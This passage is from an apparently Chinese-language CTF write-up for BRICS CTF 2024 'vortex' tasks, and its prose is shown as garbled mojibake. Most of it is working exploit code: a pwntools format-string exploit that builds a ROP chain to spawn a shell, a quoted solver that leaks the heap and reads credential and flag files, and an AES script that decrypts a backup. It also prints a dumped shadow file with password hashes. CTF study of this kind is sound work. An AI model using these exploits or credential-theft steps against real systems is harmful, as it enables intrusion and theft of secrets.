ls      = lambda data               :log.success(data)
lss     = lambda s                  :ls('\033[1;31;40m%s --> 0x%x \033[0m' % (s, eval(s)))
itr     = lambda                    :io.interactive()
# Context settings
context.arch      = 'amd64'
context.log_level = 'debug' # info
context.terminal  = ['tmux','splitw','-h','-l','170']
def start(binary,argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if   args.GDB: return gdb.debug([binary] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.CMD: return process(binary.split(' '))
    elif args.REM: return remote('89.169.156.185', 12850)
    elif args.AWD: return remote(sys.argv[1], int(sys.argv[2]))
    '''     Usage: python3 exp.py AWD <IP> <PORT>   '''
    return process([binary] + argv, *a, **kw)

binary = './cli'
libelf = ''

elf  = ELF(binary);rop = ROP(binary)
libc = elf.libc
gdbscript = '''
brva 0x000001D4A
#continue
'''.format(**locals())


#import socks
#context.proxy = (socks.SOCKS5, '192.168.80.102', 10808)

io = start(binary)
def l():
    ru('# ')
    sl('ls')
def env(cmd,n_env='',value=''):
    ru('# ')
    sl('env')
    ru(': ')
    sl(cmd)
    if cmd == 'set':
        ru(': ')
        sl(n_env)
        ru('value: ')
        sl(value)
    else:
        ru(': ')
        sl(n_env)
def set_env(n_env,value):
    env('set',n_env,value)
def get_env(n_env,value):
    env('get',n_env,value)
def logs(pay1='',pay2=''):
    ru('# ')
    if pay1 == '':
        sl('logs')
    else:
        s(pay1)
    ru(': ')
    if pay2 == '':
        sl('view')
    else:
        s(pay2)

set_env('env1',f'->%{6+0xb}$p->%{6 + 0x17}$p')
logs()
ru('->')
stack = int(ru('->'),16) - 0x18
libc_base = int(rl(),16) - 172490
lss('libc_base')
lss('stack')

libc.address = libc_base
system = libc.sym['system']
bin_sh = next(libc.search(b'/bin/sh'))
poprdi = next(libc.search(asm('pop rdi;ret')))
ret = poprdi + 1

rop = p64(poprdi+1) + p64(poprdi) + p64(bin_sh) + p64(system)
rop = rop[:-2]


for i in range(0,len(rop)):
    n = (stack + i) & 0xFF
    if n != 0:
        pay = f'%{0x100 - 24 + n}c%{6 + 0xb}$hhn' 
    else:
        pay = f'%{0x100 - 24}c%{6 + 0xb}$hhn'
    set_env('env1',pay)
    n = rop[i]
    if n != 0:
        pay = f'%{0x100 - 24 + n}c%{6 + 0x13}$hhn'
    else:
        pay = f'%{0x100 - 24}c%{6 + 0x13}$hhn'
    set_env('env1',pay)




#gdb.attach(io,gdbscript)

pay1 = b'logs'.ljust(0x8,b'\x00') + p64(stack)
pay2 = b'view'.ljust(0x8,b'\x00') + p64(stack + 0x20)
logs(pay1,pay2)


lss('libc_base')
lss('stack')

itr()

```

â€

```bash
https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-user/src/user/main.c
```

â€

* åˆ«äººçš„ wpï¼Œå­¦ä¹ ä¸€ä¸‹å“ˆå“ˆ

```python
#!/usr/bin/env python3
import pwn
pwn.context.terminal = ['tmux', 'splitw', '-h']

def set_env(io: pwn.tube, name: bytes, value: bytes) -> None:
    io.sendlineafter(b"# ", b"env")
    io.sendlineafter(b": ", b"set")
    io.sendlineafter(b": ", name)
    io.sendlineafter(b": ", value)

def view_logs(io: pwn.tube, bebra: bytes = b'') -> None:
    io.sendlineafter(b"# ", b"logs")
    io.sendlineafter(b": ", b"view\x00\x00\x00\x00" + bebra)

def solve(io: pwn.tube, off: int) -> None:
    gdbscript = '''
vmmap
'''
    # pwn.gdb.attach(io, gdbscript = gdbscript)

    # get xetrov home listing and view db.conf file
    # io.sendlineafter(b"# ", b"env")
    # io.sendlineafter(b": ", b"set")
    # io.sendlineafter(b": ", b"PWD")
    # io.sendlineafter(b": ", b"/home/xetrov")
    # io.sendlineafter(b"# ", b"ls")

    set_env(io, b'leak', b'%8$llx')
    view_logs(io)

    while True:
        line = io.recvline()

        if b'leak=' not in line:
            continue

        leak = line.strip().split(b'leak=')[1]
        heap_base = int(leak, 16) - off
        print(f'heap_base @ 0x{heap_base:x}')
        break

    target = heap_base + 0x2a20

    set_env(io, b'content', b'%17$s')

    # to steal creds
    #set_env(io, b'DATEMSK', b'/home/xetrov/db.conf')
    # to steal flag
    set_env(io, b'DATEMSK', b'/home/xetrov/user.txt')
    view_logs(io, pwn.p64(target))
    io.recvuntil(b"new env content=")
    print(io.recvuntil(b"#").decode())

def main() -> None:
    #io = pwn.process('./cli')
    for i in range(0, 0x100000, 0x10):
        io = pwn.remote('0.0.0.0', 19191)

        try:
            solve(io, i)
        finally:
            io.close()

if __name__ == '__main__':
    main()
```

â€

## HTB-vortex-system

è¿™é“é¢˜ç›®é€†å‘åˆ†æä¹Ÿæ˜¯æŒºæœ‰æ„æ€çš„ï¼Œ

* AES
* é€šè¿‡ä¸Šé¢çš„ user è¿›å»å å¯ä»¥æ‹¿åˆ° user.txt å’Œ db.conf(ssh å¯†ç  ç”¨äº vortex system)

* è¿›å»å å¯ä»¥å† opt ç›®å½•ä¸‹æ‰¾æ‰“ å¾…é€†å‘çš„ç¨‹åº

â€

* é€†å‘åˆ†æ

â€‹![image](assets/image-20241007141809-fcr05sx.png)â€‹

â€

* æ—¶é—´æˆ³ç”Ÿæˆéƒ¨åˆ†å’Œä½¿ç”¨éƒ¨åˆ†ï¼Œæ€ä¹ˆé€šè¿‡æ—¶é—´æˆ³ç”ŸæˆçœŸæ­£çš„AES çš„è¿‡ç¨‹çœ‹ä¸æ‡‚ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡åŠ¨æ€è°ƒè¯•ï¼Œå»ä¿®æ”¹ time_c çš„å€¼ ç„¶åè®©è‡ªåŠ å¯†

â€‹![image](assets/image-20241007141942-9yewlky.png)â€‹

â€‹![image](assets/image-20241007142006-8ggejke.png)â€‹

â€

â€

* ä¸»è¦åŠ å¯†é€»è¾‘

â€‹![image](assets/image-20241007142317-duvqbb8.png)â€‹

â€

â€

â€‹![image](assets/image-20241007142748-v5r6i5t.png)â€‹

â€‹![image](assets/image-20241007142804-8550636.png)â€‹

â€

* exploit

```python
from pwn import *
from Crypto.Cipher import AES

# backup_1728210186.zip

# key æ˜¯é€šè¿‡æ—¶é—´æˆ³ ç„¶ååŠ å¯†çš„ï¼Œ ï¼ˆæ–‡ä»¶åå·²ç»ç»™äº†æ—¶é—´æˆ³ï¼‰key å¯ä»¥åŠ¨è°ƒå‡ºæ¥
key = p64(0x97c54b3a53cf9250) + p64(0x9eabdf1f04adaa12)


data = open('backup_1728210186.zip','rb').read()
rnum = 'ED DA 8A 22 83 D8 FA 0D 45 84 58 1C 8B F3 46 F9'.replace(' ','')
rnum = bytes.fromhex(rnum)
rnum = data[-0x10:]
print(key)
print(rnum)


#aes = AES.new(key,AES.MODE_ECB) # ECB

aes = AES.new(key,AES.MODE_ECB)

zip = b''
rnum = list(rnum)
for i in range(0,len(data[:-0x10]),0x10):
    x = data[i:i+0x10]
    p1 = aes.decrypt(x)
    n = b''
    print(p1)
    for i in range(len(rnum)):
        n += p8(rnum[i] ^ p1[i])
        rnum[i] = x[i]
    zip += n

print(zip)

open('flag.zip','wb').write(zip)
```

â€

â€

â€‹![image](assets/image-20250101154409-b1e9zpz.png)â€‹

â€

* åé¢å¯†ç æ²¡çˆ†ç ´å‡ºæ¥ï¼ŒğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…ğŸ˜…, çˆ†å‡ºå¯†ç åº”è¯¥å°±å¯ä»¥ç›´æ¥ssh è¿è¿›å»æŸ¥çœ‹flagäº†

```python
root:$y$j9T$r/k4QwtXjjRDxxAaOaR190$cDHEIP9kaNIVoVtcv9vNwHqzrz0sAWeGzECWGDCSRb4:20001:0:99999:7:::
daemon:*:19970:0:99999:7:::
bin:*:19970:0:99999:7:::
sys:*:19970:0:99999:7:::
sync:*:19970:0:99999:7:::
games:*:19970:0:99999:7:::
man:*:19970:0:99999:7:::
lp:*:19970:0:99999:7:::
mail:*:19970:0:99999:7:::
news:*:19970:0:99999:7:::
uucp:*:19970:0:99999:7:::
proxy:*:19970:0:99999:7:::
www-data:*:19970:0:99999:7:::
backup:*:19970:0:99999:7:::
list:*:19970:0:99999:7:::
irc:*:19970:0:99999:7:::
_apt:*:19970:0:99999:7:::
nobody:*:19970:0:99999:7:::
ubuntu:!:19970:0:99999:7:::
systemd-network:!*:20001::::::
systemd-timesync:!*:20001::::::
messagebus:!:20001::::::
systemd-resolve:!*:20001::::::
sshd:!:20001::::::
xetrov:$y$j9T$XzjV7y9k5IDHF.3I78smb0$Q6xsk6ItHff./c6BuwxTfb.v7dCgjDbjxizUz7/mHv0:20001:0:99999:7:::

```

â€

* æºä»£ç  AES C

```c
https://github.com/C4T-BuT-S4D/bricsctf-2024-quals/blob/master/tasks/htb/vortex-system/src/system/aes.hpp
```

â€

â€

## END

	

```bash
https://github.com/C4T-BuT-S4D/bricsctf-2024-quals
```
